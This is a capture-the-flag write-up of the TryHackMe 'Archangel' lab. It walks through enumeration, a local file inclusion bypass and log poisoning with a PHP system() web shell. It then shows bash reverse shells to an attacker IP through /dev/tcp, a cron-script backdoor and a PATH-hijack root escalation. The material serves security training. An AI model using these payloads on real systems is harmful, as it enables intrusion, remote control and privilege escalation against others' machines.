---
layout: post
author: Marcus Loeper
---

# THM-archangel

![image](/images/Pasted image 20221023211610.png)
[Try Hack Me - Archangel](https://tryhackme.com/room/archangel)

## Enumeration

### nmap

```shell
$ sudo nmap -sV -p- archangel.thm
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-23 04:24 EDT
Nmap scan report for archangel.thm (10.10.86.119)
Host is up (0.072s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

the box had just 2 open ports.

### Website

![image](/images/Pasted image 20221023103010.png)

on the first sight i found nothing special.

### Dirbusting with ffuf

```shell
$ ffuf -w `fzf-wordlist` -u http://archangel.thm/FUZZ

                       [Status: 200, Size: 19188, Words: 2646, Lines: 321, Duration: 38ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3197ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3200ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3945ms]
flags                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 38ms]
images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 37ms]
index.html              [Status: 200, Size: 19188, Words: 2646, Lines: 321, Duration: 40ms]
layout                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 37ms]
pages                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 112ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 56ms]
:: Progress: [4614/4614] :: Job [1/1] :: 716 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

i found a directory with the name `flags`. 

![image](/images/Pasted image 20221023102743.png)

after checking out the link i got `rickrolled`. Yay!

![image](/images/Pasted image 20221023102835.png)

### Flag 1

Ok, no interesting directory, but after analyzing the code i found a support mail address of a different domain.

```html
<div class="three_quarter">
      <ul class="nospace clear">
        <li class="one_third first">
          <div class="block clear"><a href="[#](view-source:http://archangel.thm/#)"><i class="fas fa-phone"></i></a> <span><strong>Give us a call:</strong> +xx (xxx) xxxx</span></div>
        </li>
        <li class="one_third">
          <div class="block clear"><a href="[#](view-source:http://archangel.thm/#)"><i class="fas fa-envelope"></i></a> <span><strong>Send us a mail:</strong> support@mafialive.thm</span></div>
        </li>
        <li class="one_third">
          <div class="block clear"><a href="[#](view-source:http://archangel.thm/#)"><i class="fas fa-clock"></i></a> <span><strong> Mon. - Sat.:</strong> 08.00am - 18.00pm</span></div>
        </li>
      </ul>
    </div>
``` 

```html
</strong> support@mafialive.thm</span></div>
```

after adding the domain name to my hosts file i found the first flag.

![image](/images/Pasted image 20221023103313.png)

### Dirbusting mafialive.thm

then again dirbusting with ffuf.  

```shell
$ ffuf -w `fzf-wordlist` -u http://mafialive.thm/FUZZ

.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 42ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 43ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3600ms]
                        [Status: 200, Size: 59, Words: 2, Lines: 4, Duration: 3988ms]
index.html              [Status: 200, Size: 59, Words: 2, Lines: 4, Duration: 40ms]
robots.txt              [Status: 200, Size: 34, Words: 3, Lines: 3, Duration: 44ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 39ms]
:: Progress: [4614/4614] :: Job [1/1] :: 971 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

here i found a `robots.txt` file that contained this page.

![image](/images/Pasted image 20221023103822.png)

### Local file inclusion

![image](/images/Pasted image 20221023103852.png)

it took a while to get around this. in the end i wanted to see how the lfi protection works. i converted the local `test.php` to base64 that i could include itself to the site. 

```url
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

![image](/images/Pasted image 20221023103941.png)

then i needed to decode it and could craft a working payload.

```shell
$ echo -n "CQo8IUUEUgSFRN......D4KPsPgoKCg==" | base64 -d
```

```php
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

            //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            if(isset($_GET["view"])){
            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                include $_GET['view'];
            }else{

                echo 'Sorry, Thats not allowed';
            }
        }
        ?>
    </div>
</body>
</html>
```

i ended up with:

```shell
/var/www/html/development_testing/..//..//..//../etc/passwd
```

and it worked!

![image](/images/Pasted image 20221023104255.png)

after digging around further i could not find any credentials. so i looked for log files to try log poisoning.

### Log poisoning

![image](/images/Pasted image 20221023104442.png)

i used this payload

```php
<?php echo system($_GET['cmd']); ?>
```

to get it into the logs i used netcat.

```shell
$ nc mafialive.thm 80
GET /<?php echo system($_GET['cmd']); ?>
HTTP/1.1 400 Bad Request
Date: Sun, 23 Oct 2022 09:08:38 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 301
Connection: close
Content-Type: text/html; charset=iso-8859-1
```

then i activated a reverse shell with this request in burb suite. 

```shell
GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=/bin/bash+-c+'bash+-i+>%26+/dev/tcp/<attack-ip>/4444+0>%261'
```

### Flag 2

i found the second flag in the home directory of `archangel`

```shell
www-data@ubuntu:/home/archangel$ ls
myfiles  secret  user.txt
www-data@ubuntu:/home/archangel$ cat user.txt
thm{lf***************cky}
```

there was a `myfiles` directory with a file called `passwordbackup`
turns out it was another rick roll. = __ =

### Cron job

```shell
www-data@ubuntu:/home/archangel/myfiles$ ls
passwordbackup
www-data@ubuntu:/home/archangel/myfiles$ cat passwordbackup
https://www.youtube.com/watch?v=dQw4w9WgXcQ
```

i searched for files that are owned by `archangel` and got 2 that looked interesting. `/opt/helloword.sh` and `/opt/backupfiles`

```shell
www-data@ubuntu:/home/archangel/myfiles$ find / -user archangel 2>/dev/null
/opt/helloworld.sh
/opt/backupfiles
/home/archangel
/home/archangel/.selected_editor
/home/archangel/.local
/home/archangel/.local/share
/home/archangel/.profile
/home/archangel/secret
/home/archangel/user.txt
/home/archangel/myfiles
/home/archangel/.cache
/home/archangel/.bash_logout
/home/archangel/.bashrc
```

i checked again the cron jobs and now i saw the entry i was missing the first time i looked into the cron jobs.

```shell
www-data@ubuntu:/opt$ cat /etc/crontab

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   archangel /opt/helloworld.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
```

the script is very easy to exploit. just append a reverse shell command and wait for the execution of the cron job.

```shell
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
bash -i >& /dev/tcp/<attacker-ip>/4445 0>&1
```

listening on attacker box:

```shell
nc -lvnp 4445
```

i got a new shell.

```shell
listening on [any] 4445 ...
connect to [10.11.1.199] from (UNKNOWN) [10.10.86.119] 57586
bash: cannot set terminal process group (1394): Inappropriate ioctl for device
bash: no job control in this shell
archangel@ubuntu:~$ id
id
uid=1001(archangel) gid=1001(archangel) groups=1001(archangel)
```

### Flag 3

```shell
archangel@ubuntu:~$ cd secret/
archangel@ubuntu:~/secret$ ls
backup  user2.txt
archangel@ubuntu:~/secret$ cat user2.txt
thm{h0r*************************************r0n}
```

### relative path exploit

another file is owned by root in this folder. a binary that is named `backup` and has the `suid` bit set. so, getting a shell from it would escalate my privileges to root.

```shell
archangel@ubuntu:~/secret$ ls -la
total 32
drwxrwx--- 2 archangel archangel  4096 Nov 19  2020 .
drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..
-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
-rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt
```

i checked the binary with `strings` command and found that `cp` was not called with an absolute path.

```shell
archangel@ubuntu:~/secret$ strings backup

_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
cp /home/user/archangel/myfiles/* /opt/backupfiles
:*3$"
GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0
/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/Scrt1.o
__abi_tag

```

then i executed these commands and got a root shell.

```shell
archangel@ubuntu:~/secret$ echo "/bin/bash;" > /tmp/cp
archangel@ubuntu:~/secret$ chmod +x /tmp/cp
archangel@ubuntu:~/secret$ export PATH=/tmp:$PATH && ./backup
root@ubuntu:~/secret#
```

changing into the root directory i claimed the root flag.

```shell
root@ubuntu:~/secret# cd /root
root@ubuntu:/root# cat root.txt
thm{p4*********************************************************10n}
```
